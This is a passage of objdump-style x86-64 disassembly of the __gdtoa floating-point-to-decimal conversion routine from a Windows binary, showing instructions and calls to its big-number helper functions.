   140006f11:	49 89 c1             	mov    %rax,%r9
   140006f14:	44 8b 44 24 7c       	mov    0x7c(%rsp),%r8d
   140006f19:	83 7c 24 30 02       	cmpl   $0x2,0x30(%rsp)
   140006f1e:	41 0f 9f c5          	setg   %r13b
   140006f22:	45 85 c0             	test   %r8d,%r8d
   140006f25:	0f 85 1d 05 00 00    	jne    140007448 <__gdtoa+0xef8>
   140006f2b:	8b 44 24 48          	mov    0x48(%rsp),%eax
   140006f2f:	85 c0                	test   %eax,%eax
   140006f31:	0f 8f a9 02 00 00    	jg     1400071e0 <__gdtoa+0xc90>
   140006f37:	45 84 ed             	test   %r13b,%r13b
   140006f3a:	0f 84 a0 02 00 00    	je     1400071e0 <__gdtoa+0xc90>
   140006f40:	8b 44 24 48          	mov    0x48(%rsp),%eax
   140006f44:	44 89 5c 24 30       	mov    %r11d,0x30(%rsp)
   140006f49:	85 c0                	test   %eax,%eax
   140006f4b:	0f 85 bf 04 00 00    	jne    140007410 <__gdtoa+0xec0>
   140006f51:	4c 89 c9             	mov    %r9,%rcx
   140006f54:	45 31 c0             	xor    %r8d,%r8d
   140006f57:	ba 05 00 00 00       	mov    $0x5,%edx
   140006f5c:	e8 4f 13 00 00       	call   1400082b0 <__multadd_D2A>
   140006f61:	48 89 f1             	mov    %rsi,%rcx
   140006f64:	48 89 c2             	mov    %rax,%rdx
   140006f67:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140006f6c:	e8 9f 18 00 00       	call   140008810 <__cmp_D2A>
   140006f71:	4c 8b 4c 24 38       	mov    0x38(%rsp),%r9
   140006f76:	44 8b 5c 24 30       	mov    0x30(%rsp),%r11d
   140006f7b:	85 c0                	test   %eax,%eax
   140006f7d:	0f 8e 8d 04 00 00    	jle    140007410 <__gdtoa+0xec0>
   140006f83:	41 c6 07 31          	movb   $0x31,(%r15)
   140006f87:	49 8d 47 01          	lea    0x1(%r15),%rax
   140006f8b:	4c 89 c9             	mov    %r9,%rcx
   140006f8e:	44 89 5c 24 38       	mov    %r11d,0x38(%rsp)
   140006f93:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140006f98:	e8 a3 12 00 00       	call   140008240 <__Bfree_D2A>
   140006f9d:	44 8b 5c 24 38       	mov    0x38(%rsp),%r11d
   140006fa2:	48 85 ed             	test   %rbp,%rbp
   140006fa5:	c7 44 24 50 20 00 00 	movl   $0x20,0x50(%rsp)
   140006fac:	00 
   140006fad:	41 8d 43 02          	lea    0x2(%r11),%eax
   140006fb1:	89 44 24 54          	mov    %eax,0x54(%rsp)
   140006fb5:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140006fba:	74 12                	je     140006fce <__gdtoa+0xa7e>
   140006fbc:	48 89 e9             	mov    %rbp,%rcx
   140006fbf:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140006fc4:	e8 77 12 00 00       	call   140008240 <__Bfree_D2A>
   140006fc9:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140006fce:	49 39 c7             	cmp    %rax,%r15
   140006fd1:	72 0e                	jb     140006fe1 <__gdtoa+0xa91>
   140006fd3:	eb 12                	jmp    140006fe7 <__gdtoa+0xa97>
   140006fd5:	0f 1f 00             	nopl   (%rax)
   140006fd8:	48 83 e8 01          	sub    $0x1,%rax
   140006fdc:	4c 39 f8             	cmp    %r15,%rax
   140006fdf:	74 06                	je     140006fe7 <__gdtoa+0xa97>
   140006fe1:	80 78 ff 30          	cmpb   $0x30,-0x1(%rax)
   140006fe5:	74 f1                	je     140006fd8 <__gdtoa+0xa88>
   140006fe7:	48 89 f1             	mov    %rsi,%rcx
   140006fea:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140006fef:	e8 4c 12 00 00       	call   140008240 <__Bfree_D2A>
   140006ff4:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
   140006ff9:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   140006ffe:	8b 74 24 54          	mov    0x54(%rsp),%esi
   140007002:	c6 00 00             	movb   $0x0,(%rax)
   140007005:	89 37                	mov    %esi,(%rdi)
   140007007:	48 8b 7c 24 28       	mov    0x28(%rsp),%rdi
   14000700c:	48 85 ff             	test   %rdi,%rdi
   14000700f:	74 03                	je     140007014 <__gdtoa+0xac4>
   140007011:	48 89 07             	mov    %rax,(%rdi)
   140007014:	8b 44 24 50          	mov    0x50(%rsp),%eax
   140007018:	09 03                	or     %eax,(%rbx)
   14000701a:	e9 3e f8 ff ff       	jmp    14000685d <__gdtoa+0x30d>
   14000701f:	85 c9                	test   %ecx,%ecx
   140007021:	0f 85 69 0c 00 00    	jne    140007c90 <__gdtoa+0x1740>
   140007027:	66 0f 28 c8          	movapd %xmm0,%xmm1
   14000702b:	f2 0f 58 c8          	addsd  %xmm0,%xmm1
   14000702f:	f2 0f 58 0d 51 47 00 	addsd  0x4751(%rip),%xmm1        # 14000b788 <.rdata+0x48>
   140007036:	00 
   140007037:	66 48 0f 7e c8       	movq   %xmm1,%rax
   14000703c:	48 89 c2             	mov    %rax,%rdx
   14000703f:	89 c0                	mov    %eax,%eax
   140007041:	48 c1 ea 20          	shr    $0x20,%rdx
   140007045:	81 ea 00 00 40 03    	sub    $0x3400000,%edx
   14000704b:	48 c1 e2 20          	shl    $0x20,%rdx
   14000704f:	48 09 d0             	or     %rdx,%rax
   140007052:	f2 0f 5c 05 46 47 00 	subsd  0x4746(%rip),%xmm0        # 14000b7a0 <.rdata+0x60>
   140007059:	00 
   14000705a:	66 48 0f 6e c8       	movq   %rax,%xmm1
   14000705f:	66 0f 2f c1          	comisd %xmm1,%xmm0
   140007063:	0f 87 d0 0a 00 00    	ja     140007b39 <__gdtoa+0x15e9>
   140007069:	66 0f 57 0d 3f 47 00 	xorpd  0x473f(%rip),%xmm1        # 14000b7b0 <.rdata+0x70>
   140007070:	00 
   140007071:	66 0f 2f c8          	comisd %xmm0,%xmm1
   140007075:	0f 87 a3 06 00 00    	ja     14000771e <__gdtoa+0x11ce>
   14000707b:	c7 44 24 64 00 00 00 	movl   $0x0,0x64(%rsp)
   140007082:	00 
   140007083:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007088:	44 8b 54 24 58       	mov    0x58(%rsp),%r10d
   14000708d:	45 85 d2             	test   %r10d,%r10d
   140007090:	0f 88 8a 00 00 00    	js     140007120 <__gdtoa+0xbd0>
   140007096:	45 39 5d 14          	cmp    %r11d,0x14(%r13)
   14000709a:	0f 8c 80 00 00 00    	jl     140007120 <__gdtoa+0xbd0>
   1400070a0:	4c 8b 0d b9 49 00 00 	mov    0x49b9(%rip),%r9        # 14000ba60 <.refptr.__tens_D2A>
   1400070a7:	49 63 c3             	movslq %r11d,%rax
   1400070aa:	f2 41 0f 10 14 c1    	movsd  (%r9,%rax,8),%xmm2
   1400070b0:	44 8b 4c 24 40       	mov    0x40(%rsp),%r9d
   1400070b5:	45 85 c9             	test   %r9d,%r9d
   1400070b8:	0f 89 12 fb ff ff    	jns    140006bd0 <__gdtoa+0x680>
   1400070be:	8b 44 24 48          	mov    0x48(%rsp),%eax
   1400070c2:	85 c0                	test   %eax,%eax
   1400070c4:	0f 8f 06 fb ff ff    	jg     140006bd0 <__gdtoa+0x680>
   1400070ca:	0f 85 4e 06 00 00    	jne    14000771e <__gdtoa+0x11ce>
   1400070d0:	f2 0f 59 15 c8 46 00 	mulsd  0x46c8(%rip),%xmm2        # 14000b7a0 <.rdata+0x60>
   1400070d7:	00 
   1400070d8:	66 0f 2f 94 24 80 00 	comisd 0x80(%rsp),%xmm2
   1400070df:	00 00 
   1400070e1:	0f 83 37 06 00 00    	jae    14000771e <__gdtoa+0x11ce>
   1400070e7:	41 c6 07 31          	movb   $0x31,(%r15)
   1400070eb:	49 8d 47 01          	lea    0x1(%r15),%rax
   1400070ef:	31 c9                	xor    %ecx,%ecx
   1400070f1:	44 89 5c 24 38       	mov    %r11d,0x38(%rsp)
   1400070f6:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400070fb:	e8 40 11 00 00       	call   140008240 <__Bfree_D2A>
   140007100:	44 8b 5c 24 38       	mov    0x38(%rsp),%r11d
   140007105:	c7 44 24 50 20 00 00 	movl   $0x20,0x50(%rsp)
   14000710c:	00 
   14000710d:	41 8d 43 02          	lea    0x2(%r11),%eax
   140007111:	89 44 24 54          	mov    %eax,0x54(%rsp)
   140007115:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   14000711a:	e9 af fe ff ff       	jmp    140006fce <__gdtoa+0xa7e>
   14000711f:	90                   	nop
   140007120:	44 8b 84 24 8c 00 00 	mov    0x8c(%rsp),%r8d
   140007127:	00 
   140007128:	45 85 c0             	test   %r8d,%r8d
   14000712b:	0f 85 df 04 00 00    	jne    140007610 <__gdtoa+0x10c0>
   140007131:	8b 44 24 60          	mov    0x60(%rsp),%eax
   140007135:	85 c0                	test   %eax,%eax
   140007137:	0f 84 33 05 00 00    	je     140007670 <__gdtoa+0x1120>
   14000713d:	8b 44 24 54          	mov    0x54(%rsp),%eax
   140007141:	85 c0                	test   %eax,%eax
   140007143:	0f 84 27 05 00 00    	je     140007670 <__gdtoa+0x1120>
   140007149:	8b 54 24 60          	mov    0x60(%rsp),%edx
   14000714d:	8b 4c 24 54          	mov    0x54(%rsp),%ecx
   140007151:	8b 6c 24 68          	mov    0x68(%rsp),%ebp
   140007155:	39 ca                	cmp    %ecx,%edx
   140007157:	89 c8                	mov    %ecx,%eax
   140007159:	0f 4e c2             	cmovle %edx,%eax
   14000715c:	29 c2                	sub    %eax,%edx
   14000715e:	29 c1                	sub    %eax,%ecx
   140007160:	89 84 24 9c 00 00 00 	mov    %eax,0x9c(%rsp)
   140007167:	89 54 24 60          	mov    %edx,0x60(%rsp)
   14000716b:	89 4c 24 54          	mov    %ecx,0x54(%rsp)
   14000716f:	85 ed                	test   %ebp,%ebp
   140007171:	0f 85 f9 05 00 00    	jne    140007770 <__gdtoa+0x1220>
   140007177:	89 94 24 80 00 00 00 	mov    %edx,0x80(%rsp)
   14000717e:	31 ed                	xor    %ebp,%ebp
   140007180:	e9 da fc ff ff       	jmp    140006e5f <__gdtoa+0x90f>
   140007185:	c7 84 24 8c 00 00 00 	movl   $0x1,0x8c(%rsp)
   14000718c:	01 00 00 00 
   140007190:	8b 54 24 40          	mov    0x40(%rsp),%edx
   140007194:	b8 01 00 00 00       	mov    $0x1,%eax
   140007199:	44 89 5c 24 64       	mov    %r11d,0x64(%rsp)
   14000719e:	85 d2                	test   %edx,%edx
   1400071a0:	0f 4f c2             	cmovg  %edx,%eax
   1400071a3:	89 c1                	mov    %eax,%ecx
   1400071a5:	89 84 24 9c 00 00 00 	mov    %eax,0x9c(%rsp)
   1400071ac:	89 44 24 78          	mov    %eax,0x78(%rsp)
   1400071b0:	e8 2b f1 ff ff       	call   1400062e0 <__rv_alloc_D2A>
   1400071b5:	44 8b 5c 24 64       	mov    0x64(%rsp),%r11d
   1400071ba:	49 89 c7             	mov    %rax,%r15
   1400071bd:	8b 44 24 78          	mov    0x78(%rsp),%eax
   1400071c1:	89 44 24 48          	mov    %eax,0x48(%rsp)
   1400071c5:	89 44 24 40          	mov    %eax,0x40(%rsp)
   1400071c9:	e9 f0 f7 ff ff       	jmp    1400069be <__gdtoa+0x46e>
   1400071ce:	66 90                	xchg   %ax,%ax
   1400071d0:	44 01 5c 24 54       	add    %r11d,0x54(%rsp)
   1400071d5:	44 89 5c 24 70       	mov    %r11d,0x70(%rsp)
   1400071da:	e9 fe f5 ff ff       	jmp    1400067dd <__gdtoa+0x28d>
   1400071df:	90                   	nop
   1400071e0:	41 8d 43 01          	lea    0x1(%r11),%eax
   1400071e4:	89 44 24 54          	mov    %eax,0x54(%rsp)
   1400071e8:	8b 44 24 68          	mov    0x68(%rsp),%eax
   1400071ec:	85 c0                	test   %eax,%eax
   1400071ee:	0f 84 dc 02 00 00    	je     1400074d0 <__gdtoa+0xf80>
   1400071f4:	8b 94 24 80 00 00 00 	mov    0x80(%rsp),%edx
   1400071fb:	44 01 e2             	add    %r12d,%edx
   1400071fe:	85 d2                	test   %edx,%edx
   140007200:	7e 15                	jle    140007217 <__gdtoa+0xcc7>
   140007202:	48 89 e9             	mov    %rbp,%rcx
   140007205:	4c 89 4c 24 38       	mov    %r9,0x38(%rsp)
   14000720a:	e8 f1 14 00 00       	call   140008700 <__lshift_D2A>
   14000720f:	4c 8b 4c 24 38       	mov    0x38(%rsp),%r9
   140007214:	48 89 c5             	mov    %rax,%rbp
   140007217:	8b 44 24 70          	mov    0x70(%rsp),%eax
   14000721b:	49 89 ed             	mov    %rbp,%r13
   14000721e:	85 c0                	test   %eax,%eax
   140007220:	0f 85 8a 08 00 00    	jne    140007ab0 <__gdtoa+0x1560>
   140007226:	4d 89 fa             	mov    %r15,%r10
   140007229:	83 7c 24 64 02       	cmpl   $0x2,0x64(%rsp)
   14000722e:	4c 89 7c 24 68       	mov    %r15,0x68(%rsp)
   140007233:	b8 01 00 00 00       	mov    $0x1,%eax
   140007238:	49 89 ff             	mov    %rdi,%r15
   14000723b:	4c 89 4c 24 38       	mov    %r9,0x38(%rsp)
   140007240:	4c 89 d7             	mov    %r10,%rdi
   140007243:	48 89 5c 24 70       	mov    %rbx,0x70(%rsp)
   140007248:	0f 95 44 24 60       	setne  0x60(%rsp)
   14000724d:	e9 a8 00 00 00       	jmp    1400072fa <__gdtoa+0xdaa>
   140007252:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140007258:	48 89 d1             	mov    %rdx,%rcx
   14000725b:	e8 e0 0f 00 00       	call   140008240 <__Bfree_D2A>
   140007260:	ba 01 00 00 00       	mov    $0x1,%edx
   140007265:	45 85 e4             	test   %r12d,%r12d
   140007268:	0f 88 2b 07 00 00    	js     140007999 <__gdtoa+0x1449>
   14000726e:	44 0b 64 24 30       	or     0x30(%rsp),%r12d
   140007273:	75 0a                	jne    14000727f <__gdtoa+0xd2f>
   140007275:	41 f6 07 01          	testb  $0x1,(%r15)
   140007279:	0f 84 1a 07 00 00    	je     140007999 <__gdtoa+0x1449>
   14000727f:	4c 8d 67 01          	lea    0x1(%rdi),%r12
   140007283:	4d 89 e6             	mov    %r12,%r14
   140007286:	85 d2                	test   %edx,%edx
   140007288:	7e 0b                	jle    140007295 <__gdtoa+0xd45>
   14000728a:	80 7c 24 60 00       	cmpb   $0x0,0x60(%rsp)
   14000728f:	0f 85 d2 08 00 00    	jne    140007b67 <__gdtoa+0x1617>
   140007295:	41 88 5c 24 ff       	mov    %bl,-0x1(%r12)
   14000729a:	8b 44 24 48          	mov    0x48(%rsp),%eax
   14000729e:	39 84 24 9c 00 00 00 	cmp    %eax,0x9c(%rsp)
   1400072a5:	0f 84 f8 08 00 00    	je     140007ba3 <__gdtoa+0x1653>
   1400072ab:	48 89 f1             	mov    %rsi,%rcx
   1400072ae:	45 31 c0             	xor    %r8d,%r8d
   1400072b1:	ba 0a 00 00 00       	mov    $0xa,%edx
   1400072b6:	e8 f5 0f 00 00       	call   1400082b0 <__multadd_D2A>
   1400072bb:	45 31 c0             	xor    %r8d,%r8d
   1400072be:	ba 0a 00 00 00       	mov    $0xa,%edx
   1400072c3:	48 89 e9             	mov    %rbp,%rcx
   1400072c6:	48 89 c6             	mov    %rax,%rsi
   1400072c9:	4c 39 ed             	cmp    %r13,%rbp
   1400072cc:	0f 84 2e 01 00 00    	je     140007400 <__gdtoa+0xeb0>
   1400072d2:	e8 d9 0f 00 00       	call   1400082b0 <__multadd_D2A>
   1400072d7:	4c 89 e9             	mov    %r13,%rcx
   1400072da:	45 31 c0             	xor    %r8d,%r8d
   1400072dd:	ba 0a 00 00 00       	mov    $0xa,%edx
   1400072e2:	48 89 c5             	mov    %rax,%rbp
   1400072e5:	e8 c6 0f 00 00       	call   1400082b0 <__multadd_D2A>
   1400072ea:	49 89 c5             	mov    %rax,%r13
   1400072ed:	8b 84 24 9c 00 00 00 	mov    0x9c(%rsp),%eax
   1400072f4:	4c 89 e7             	mov    %r12,%rdi
   1400072f7:	83 c0 01             	add    $0x1,%eax
   1400072fa:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   1400072ff:	48 89 f1             	mov    %rsi,%rcx
   140007302:	89 84 24 9c 00 00 00 	mov    %eax,0x9c(%rsp)
   140007309:	e8 c2 f0 ff ff       	call   1400063d0 <__quorem_D2A>
   14000730e:	48 89 ea             	mov    %rbp,%rdx
   140007311:	48 89 f1             	mov    %rsi,%rcx
   140007314:	41 89 c6             	mov    %eax,%r14d
   140007317:	8d 58 30             	lea    0x30(%rax),%ebx
   14000731a:	e8 f1 14 00 00       	call   140008810 <__cmp_D2A>
   14000731f:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140007324:	4c 89 ea             	mov    %r13,%rdx
   140007327:	41 89 c4             	mov    %eax,%r12d
   14000732a:	e8 31 15 00 00       	call   140008860 <__diff_D2A>
   14000732f:	48 89 c2             	mov    %rax,%rdx
   140007332:	8b 40 10             	mov    0x10(%rax),%eax
   140007335:	85 c0                	test   %eax,%eax
   140007337:	0f 85 1b ff ff ff    	jne    140007258 <__gdtoa+0xd08>
   14000733d:	48 89 f1             	mov    %rsi,%rcx
   140007340:	48 89 54 24 58       	mov    %rdx,0x58(%rsp)
   140007345:	e8 c6 14 00 00       	call   140008810 <__cmp_D2A>
   14000734a:	48 8b 4c 24 58       	mov    0x58(%rsp),%rcx
   14000734f:	89 44 24 40          	mov    %eax,0x40(%rsp)
   140007353:	e8 e8 0e 00 00       	call   140008240 <__Bfree_D2A>
   140007358:	8b 54 24 40          	mov    0x40(%rsp),%edx
   14000735c:	8b 44 24 30          	mov    0x30(%rsp),%eax
   140007360:	09 c2                	or     %eax,%edx
   140007362:	0f 85 da 03 00 00    	jne    140007742 <__gdtoa+0x11f2>
   140007368:	41 8b 07             	mov    (%r15),%eax
   14000736b:	83 e0 01             	and    $0x1,%eax
   14000736e:	0b 44 24 64          	or     0x64(%rsp),%eax
   140007372:	0f 85 ed fe ff ff    	jne    140007265 <__gdtoa+0xd15>
   140007378:	41 89 d8             	mov    %ebx,%r8d
   14000737b:	4c 8b 4c 24 38       	mov    0x38(%rsp),%r9
   140007380:	4c 8b 7c 24 68       	mov    0x68(%rsp),%r15
   140007385:	49 89 fa             	mov    %rdi,%r10
   140007388:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   14000738d:	41 83 f8 39          	cmp    $0x39,%r8d
   140007391:	0f 84 d1 09 00 00    	je     140007d68 <__gdtoa+0x1818>
   140007397:	45 85 e4             	test   %r12d,%r12d
   14000739a:	0f 8e 10 0b 00 00    	jle    140007eb0 <__gdtoa+0x1960>
   1400073a0:	c7 44 24 50 20 00 00 	movl   $0x20,0x50(%rsp)
   1400073a7:	00 
   1400073a8:	45 8d 46 31          	lea    0x31(%r14),%r8d
   1400073ac:	45 88 02             	mov    %r8b,(%r10)
   1400073af:	48 89 ef             	mov    %rbp,%rdi
   1400073b2:	49 8d 42 01          	lea    0x1(%r10),%rax
   1400073b6:	4c 89 ed             	mov    %r13,%rbp
   1400073b9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400073c0:	4c 89 c9             	mov    %r9,%rcx
   1400073c3:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   1400073c8:	e8 73 0e 00 00       	call   140008240 <__Bfree_D2A>
   1400073cd:	48 85 ed             	test   %rbp,%rbp
   1400073d0:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   1400073d5:	0f 84 f3 fb ff ff    	je     140006fce <__gdtoa+0xa7e>
   1400073db:	48 85 ff             	test   %rdi,%rdi
   1400073de:	0f 84 d8 fb ff ff    	je     140006fbc <__gdtoa+0xa6c>
   1400073e4:	48 39 ef             	cmp    %rbp,%rdi
   1400073e7:	0f 84 cf fb ff ff    	je     140006fbc <__gdtoa+0xa6c>
   1400073ed:	48 89 f9             	mov    %rdi,%rcx
   1400073f0:	e8 4b 0e 00 00       	call   140008240 <__Bfree_D2A>
   1400073f5:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   1400073fa:	e9 bd fb ff ff       	jmp    140006fbc <__gdtoa+0xa6c>
   1400073ff:	90                   	nop
   140007400:	e8 ab 0e 00 00       	call   1400082b0 <__multadd_D2A>
   140007405:	48 89 c5             	mov    %rax,%rbp
   140007408:	49 89 c5             	mov    %rax,%r13
   14000740b:	e9 dd fe ff ff       	jmp    1400072ed <__gdtoa+0xd9d>
   140007410:	4c 89 c9             	mov    %r9,%rcx
   140007413:	e8 28 0e 00 00       	call   140008240 <__Bfree_D2A>
   140007418:	8b 44 24 40          	mov    0x40(%rsp),%eax
   14000741c:	f7 d8                	neg    %eax
   14000741e:	89 44 24 54          	mov    %eax,0x54(%rsp)
   140007422:	48 85 ed             	test   %rbp,%rbp
   140007425:	0f 84 69 0a 00 00    	je     140007e94 <__gdtoa+0x1944>
   14000742b:	48 89 e9             	mov    %rbp,%rcx
   14000742e:	e8 0d 0e 00 00       	call   140008240 <__Bfree_D2A>
   140007433:	c7 44 24 50 10 00 00 	movl   $0x10,0x50(%rsp)
   14000743a:	00 
   14000743b:	4c 89 f8             	mov    %r15,%rax
   14000743e:	e9 a4 fb ff ff       	jmp    140006fe7 <__gdtoa+0xa97>
   140007443:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140007448:	4c 89 ca             	mov    %r9,%rdx
   14000744b:	48 89 f1             	mov    %rsi,%rcx
   14000744e:	44 89 5c 24 54       	mov    %r11d,0x54(%rsp)
   140007453:	4c 89 4c 24 38       	mov    %r9,0x38(%rsp)
   140007458:	e8 b3 13 00 00       	call   140008810 <__cmp_D2A>
   14000745d:	4c 8b 4c 24 38       	mov    0x38(%rsp),%r9
   140007462:	44 8b 5c 24 54       	mov    0x54(%rsp),%r11d
   140007467:	85 c0                	test   %eax,%eax
   140007469:	0f 89 bc fa ff ff    	jns    140006f2b <__gdtoa+0x9db>
   14000746f:	48 89 f1             	mov    %rsi,%rcx
   140007472:	45 31 c0             	xor    %r8d,%r8d
   140007475:	ba 0a 00 00 00       	mov    $0xa,%edx
   14000747a:	4c 89 4c 24 48       	mov    %r9,0x48(%rsp)
   14000747f:	44 89 5c 24 38       	mov    %r11d,0x38(%rsp)
   140007484:	45 8d 73 ff          	lea    -0x1(%r11),%r14d
   140007488:	e8 23 0e 00 00       	call   1400082b0 <__multadd_D2A>
   14000748d:	8b 54 24 78          	mov    0x78(%rsp),%edx
   140007491:	8b 4c 24 68          	mov    0x68(%rsp),%ecx
   140007495:	48 89 c6             	mov    %rax,%rsi
   140007498:	44 8b 5c 24 38       	mov    0x38(%rsp),%r11d
   14000749d:	4c 8b 4c 24 48       	mov    0x48(%rsp),%r9
   1400074a2:	85 d2                	test   %edx,%edx
   1400074a4:	0f 9e c0             	setle  %al
   1400074a7:	41 21 c5             	and    %eax,%r13d
   1400074aa:	85 c9                	test   %ecx,%ecx
   1400074ac:	0f 85 d9 08 00 00    	jne    140007d8b <__gdtoa+0x183b>
   1400074b2:	45 84 ed             	test   %r13b,%r13b
   1400074b5:	0f 85 c5 07 00 00    	jne    140007c80 <__gdtoa+0x1730>
   1400074bb:	8b 44 24 78          	mov    0x78(%rsp),%eax
   1400074bf:	44 89 5c 24 54       	mov    %r11d,0x54(%rsp)
   1400074c4:	89 44 24 48          	mov    %eax,0x48(%rsp)
   1400074c8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400074cf:	00 
   1400074d0:	8b 7c 24 48          	mov    0x48(%rsp),%edi
   1400074d4:	4d 89 fe             	mov    %r15,%r14
   1400074d7:	b8 01 00 00 00       	mov    $0x1,%eax
   1400074dc:	4d 89 cc             	mov    %r9,%r12
   1400074df:	eb 24                	jmp    140007505 <__gdtoa+0xfb5>
   1400074e1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400074e8:	48 89 f1             	mov    %rsi,%rcx
   1400074eb:	45 31 c0             	xor    %r8d,%r8d
   1400074ee:	ba 0a 00 00 00       	mov    $0xa,%edx
   1400074f3:	e8 b8 0d 00 00       	call   1400082b0 <__multadd_D2A>
   1400074f8:	48 89 c6             	mov    %rax,%rsi
   1400074fb:	8b 84 24 9c 00 00 00 	mov    0x9c(%rsp),%eax
   140007502:	83 c0 01             	add    $0x1,%eax
   140007505:	4c 89 e2             	mov    %r12,%rdx
   140007508:	48 89 f1             	mov    %rsi,%rcx
   14000750b:	89 84 24 9c 00 00 00 	mov    %eax,0x9c(%rsp)
   140007512:	49 83 c6 01          	add    $0x1,%r14
   140007516:	e8 b5 ee ff ff       	call   1400063d0 <__quorem_D2A>
   14000751b:	44 8d 40 30          	lea    0x30(%rax),%r8d
   14000751f:	45 88 46 ff          	mov    %r8b,-0x1(%r14)
   140007523:	39 bc 24 9c 00 00 00 	cmp    %edi,0x9c(%rsp)
   14000752a:	7c bc                	jl     1400074e8 <__gdtoa+0xf98>
   14000752c:	4d 89 e1             	mov    %r12,%r9
   14000752f:	31 ff                	xor    %edi,%edi
   140007531:	8b 44 24 64          	mov    0x64(%rsp),%eax
   140007535:	85 c0                	test   %eax,%eax
   140007537:	0f 84 f9 02 00 00    	je     140007836 <__gdtoa+0x12e6>
   14000753d:	83 f8 02             	cmp    $0x2,%eax
   140007540:	0f 84 35 03 00 00    	je     14000787b <__gdtoa+0x132b>
   140007546:	83 7e 14 01          	cmpl   $0x1,0x14(%rsi)
   14000754a:	7f 2d                	jg     140007579 <__gdtoa+0x1029>
   14000754c:	8b 46 18             	mov    0x18(%rsi),%eax
   14000754f:	85 c0                	test   %eax,%eax
   140007551:	75 26                	jne    140007579 <__gdtoa+0x1029>
   140007553:	85 c0                	test   %eax,%eax
   140007555:	0f 95 c0             	setne  %al
   140007558:	0f b6 c0             	movzbl %al,%eax
   14000755b:	c1 e0 04             	shl    $0x4,%eax
   14000755e:	89 44 24 50          	mov    %eax,0x50(%rsp)
   140007562:	4c 89 f0             	mov    %r14,%rax
   140007565:	e9 56 fe ff ff       	jmp    1400073c0 <__gdtoa+0xe70>
   14000756a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140007570:	4d 39 fe             	cmp    %r15,%r14
   140007573:	0f 84 a7 02 00 00    	je     140007820 <__gdtoa+0x12d0>
   140007579:	4c 89 f0             	mov    %r14,%rax
   14000757c:	4d 8d 76 ff          	lea    -0x1(%r14),%r14
   140007580:	0f b6 50 ff          	movzbl -0x1(%rax),%edx
   140007584:	80 fa 39             	cmp    $0x39,%dl
   140007587:	74 e7                	je     140007570 <__gdtoa+0x1020>
   140007589:	83 c2 01             	add    $0x1,%edx
   14000758c:	c7 44 24 50 20 00 00 	movl   $0x20,0x50(%rsp)
   140007593:	00 
   140007594:	41 88 16             	mov    %dl,(%r14)
   140007597:	e9 24 fe ff ff       	jmp    1400073c0 <__gdtoa+0xe70>
   14000759c:	0f 1f 40 00          	nopl   0x0(%rax)
   1400075a0:	8b 54 24 70          	mov    0x70(%rsp),%edx
   1400075a4:	4c 89 c9             	mov    %r9,%rcx
   1400075a7:	e8 d4 0f 00 00       	call   140008580 <__pow5mult_D2A>
   1400075ac:	45 84 e4             	test   %r12b,%r12b
   1400075af:	44 8b 5c 24 58       	mov    0x58(%rsp),%r11d
   1400075b4:	49 89 c1             	mov    %rax,%r9
   1400075b7:	0f 85 93 06 00 00    	jne    140007c50 <__gdtoa+0x1700>
   1400075bd:	c7 44 24 70 00 00 00 	movl   $0x0,0x70(%rsp)
   1400075c4:	00 
   1400075c5:	41 8b 41 14          	mov    0x14(%r9),%eax
   1400075c9:	83 e8 01             	sub    $0x1,%eax
   1400075cc:	48 98                	cltq
   1400075ce:	45 0f bd 64 81 18    	bsr    0x18(%r9,%rax,4),%r12d
   1400075d4:	41 83 f4 1f          	xor    $0x1f,%r12d
   1400075d8:	e9 c9 f8 ff ff       	jmp    140006ea6 <__gdtoa+0x956>
   1400075dd:	0f 1f 00             	nopl   (%rax)
   1400075e0:	c7 84 24 9c 00 00 00 	movl   $0x1,0x9c(%rsp)
   1400075e7:	01 00 00 00 
   1400075eb:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400075f0:	e8 eb ec ff ff       	call   1400062e0 <__rv_alloc_D2A>
   1400075f5:	44 8b 5c 24 64       	mov    0x64(%rsp),%r11d
   1400075fa:	49 89 c7             	mov    %rax,%r15
   1400075fd:	e9 bc f3 ff ff       	jmp    1400069be <__gdtoa+0x46e>
   140007602:	c7 44 24 64 00 00 00 	movl   $0x0,0x64(%rsp)
   140007609:	00 
   14000760a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140007610:	8b 54 24 58          	mov    0x58(%rsp),%edx
   140007614:	45 29 f4             	sub    %r14d,%r12d
   140007617:	41 8b 45 04          	mov    0x4(%r13),%eax
   14000761b:	44 29 e2             	sub    %r12d,%edx
   14000761e:	39 d0                	cmp    %edx,%eax
   140007620:	0f 8f e5 01 00 00    	jg     14000780b <__gdtoa+0x12bb>
   140007626:	8b 4c 24 48          	mov    0x48(%rsp),%ecx
   14000762a:	8b 44 24 68          	mov    0x68(%rsp),%eax
   14000762e:	8d 51 ff             	lea    -0x1(%rcx),%edx
   140007631:	39 d0                	cmp    %edx,%eax
   140007633:	0f 8c 6a 01 00 00    	jl     1400077a3 <__gdtoa+0x1253>
   140007639:	41 89 c4             	mov    %eax,%r12d
   14000763c:	41 29 d4             	sub    %edx,%r12d
   14000763f:	85 c9                	test   %ecx,%ecx
   140007641:	0f 89 02 08 00 00    	jns    140007e49 <__gdtoa+0x18f9>
   140007647:	8b 44 24 60          	mov    0x60(%rsp),%eax
   14000764b:	8b 4c 24 48          	mov    0x48(%rsp),%ecx
